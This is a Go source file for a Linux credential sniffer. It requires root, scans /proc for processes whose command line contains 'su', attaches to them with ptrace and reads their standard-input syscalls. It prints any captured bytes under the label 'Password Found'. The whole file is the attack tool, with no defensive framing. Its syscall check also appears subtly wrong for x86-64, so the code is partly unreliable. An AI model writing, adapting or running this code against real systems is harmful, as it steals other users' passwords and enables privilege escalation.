package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func watchSUProcesses() {
	processedPIDs := make(map[int]struct{})
	for {
		select {
		case <-shutdownChan:
			return
		default:
			suPIDs, err := findSUProcesses()
			if err != nil {
				time.Sleep(5 * time.Second)
				continue
			}
			for _, pid := range suPIDs {
				if _, processed := processedPIDs[pid]; !processed {
					go traceSUProcess(pid)
					processedPIDs[pid] = struct{}{}
				}
			}

			time.Sleep(1 * time.Second / 2)
		}
	}
}

func findSUProcesses() ([]int, error) {
	var suPIDs []int
	dir, err := os.Open("/proc")
	if err != nil {
		return nil, err
	}
	defer dir.Close()
	entries, err := dir.Readdirnames(0)
	if err != nil {
		return nil, err
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}
		if isSUProcess(pid) {
			suPIDs = append(suPIDs, pid)
		}
	}

	return suPIDs, nil
}

func isSUProcess(pid int) bool {
	cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`su`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func traceSUProcess(pid int) {
	fmt.Printf("Tracing: %d\n", pid)
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var status syscall.WaitStatus
	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
	if err != nil {
		return
	}
	for {
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			return
		}

		if status.Exited() {
			break
		}

		if status.Stopped() && status.StopSignal() == syscall.SIGTRAP {
			var regs syscall.PtraceRegs
			err := syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				return
			}

			if regs.Orig_rax == 3 {
				fd := int(regs.Rdi)
				readLength := int(regs.Rdx)
				length := int(regs.Rax)

				if fd == 0 && readLength == 511 {
					buffer := make([]byte, length)
					_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
					if err != nil {
						return
					}
					fmt.Printf("Password Found: %s\n", buffer)
					fmt.Printf("Password Found: %x\n", buffer)
					fmt.Printf("File Descriptor: %d\n", regs.Rdi)
					fmt.Printf("Buffer Address: %d\n", regs.Rsi)
					fmt.Printf("Count: %d\n", regs.Rdx)
				}
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			return
		}
	}
}

var shutdownChan = make(chan struct{})

func main() {
	if syscall.Geteuid() != 0 {
		os.Exit(1)
	}
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigc
		close(shutdownChan)
		os.Exit(0)
	}()
	watchSUProcesses()
}
